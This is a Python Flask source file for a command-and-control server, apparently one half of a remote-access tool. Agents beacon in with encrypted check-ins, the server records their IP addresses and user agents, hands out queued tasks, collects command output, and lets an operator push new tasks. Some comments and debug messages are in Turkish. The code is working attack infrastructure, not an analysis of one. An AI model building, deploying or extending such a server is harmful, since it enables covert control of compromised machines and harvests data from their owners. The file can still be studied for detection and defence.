from datetime import datetime, timezone
import json
import logging
import os.path
from flask import Flask, request, jsonify
from Encryption import encrypt_data, decrypt_data
app = Flask(__name__)

#Logging Settings
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log',encoding='utf-8'),
        logging.StreamHandler()
    ])
logger = logging.getLogger(__name__)

#persistent files
TASKS_FILE = 'tasks.json'
AGENTS_FILE = 'agents.json'

def load_data(file_path, default):
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"{file_path} not found: {e}")
            return default
    else:
        logger.info(f"{file_path} bulunamadı, varsayılan değer kullanılıyor")
        return default

def save_data(file_path, data):
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"[!] Write Error: {file_path} - {e}")
tasks = load_data(TASKS_FILE, {})
agents = load_data(AGENTS_FILE, {})

@app.route('/api/beacon', methods = ['POST'])
def beacon():
    #json data comes encrypted
    try:
        payload = request.get_json()
        if not payload or 'data' not in payload:
            return jsonify({"error": "No data"}), 400

        # We decrypt it
        encrypted = payload['data']
        print("[DEBUG beacon] Gelen encrypted token:", encrypted[:150], "...")  # token'ın başını gör
        print("[DEBUG beacon] Token uzunluğu:", len(encrypted))

        decrypted = decrypt_data(encrypted)
        print("[DEBUG beacon] Çözülen metin:", decrypted)

        info = json.loads(decrypted)
        print("[DEBUG beacon] JSON parsed:", info)

        agent_id = info.get('id')
        print(f"[DEBUG] agent_id alındı: {agent_id} (type: {type(agent_id)})")
        if not agent_id:
            return jsonify({"error": "No agent_id"}), 400

        #update agent info
        agents[agent_id] = agents.get(agent_id, {})
        agents[agent_id].update({
            "last_seen": datetime.now(timezone.utc).isoformat(), "ip": request.remote_addr,
            "user_agent": request.headers.get('User-Agent',"Unknown")
        })
        save_data(AGENTS_FILE, agents)

        #Is there any waiting task for this agent?
        pending_task = None
        if agent_id in tasks and tasks[agent_id]:
            pending_task = tasks[agent_id].pop(0)
            save_data(TASKS_FILE, tasks)
        response = {"task": pending_task}
        encrypted_response = encrypt_data(json.dumps(response))
        logger.info(f"BEACON {agent_id} - IP: {request.remote_addr} - task verildi: {pending_task is not None}")
        return jsonify({"data": encrypted_response})
    except Exception as e:
        print("[DEBUG beacon] HATA:", type(e).__name__, str(e))
        logger.error(f"[!] Beacon error: {e}")
        return jsonify({"error": "Beacon error"}), 500

@app.route('/api/result', methods= ['POST'])
def result():
    try:
        payload = request.get_json()
        if not payload or 'data' not in payload:
            return jsonify({"error": "No data"}), 400
        encrypted = payload['data']
        decrypted = decrypt_data(encrypted)
        result_info = json.loads(decrypted)
        agent_id = result_info.get('id')
        output = result_info.get('output')

        if not agent_id or output is None:
            return jsonify({"error": "No agent_id or Output"}), 400

        if agent_id in agents:
            agents[agent_id]["last_result"] = datetime.now(timezone.utc).isoformat()
            save_data(AGENTS_FILE, agents)
        logger.info(f"RESULT {agent_id}:\n{output}\n{'-'*100}")
        return jsonify({"status": "received"}), 200
    except Exception as e:
        logger.error(f"[!] Result error: {e}")
        return jsonify({"error": "Result error"}), 500


@app.route('/api/push_task', methods = ['POST'])
def push_task():
    try:
        payload = request.get_json()
        if not payload or 'data' not in payload:
            return jsonify({"error": "No data"}), 400
        encrypted = payload['data']
        decrypted = decrypt_data(encrypted)
        info = json.loads(decrypted)
        agent_id = info.get('id')
        task= info.get('task')

        if not agent_id or not isinstance(task, dict):
            return jsonify({"error": "Corrupted agent_id or task format"}), 400
        if agent_id not in tasks:
            tasks[agent_id] = []

        tasks[agent_id].append(task)
        save_data(TASKS_FILE, tasks)

        logger.info(f"PUSH_TASK {agent_id}:\n{tasks}")
        return jsonify({"status": "queued"})
    except Exception as e:
        logger.error(f"[!] Push task error: {e}")
        return jsonify({"error": "Push task error"}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)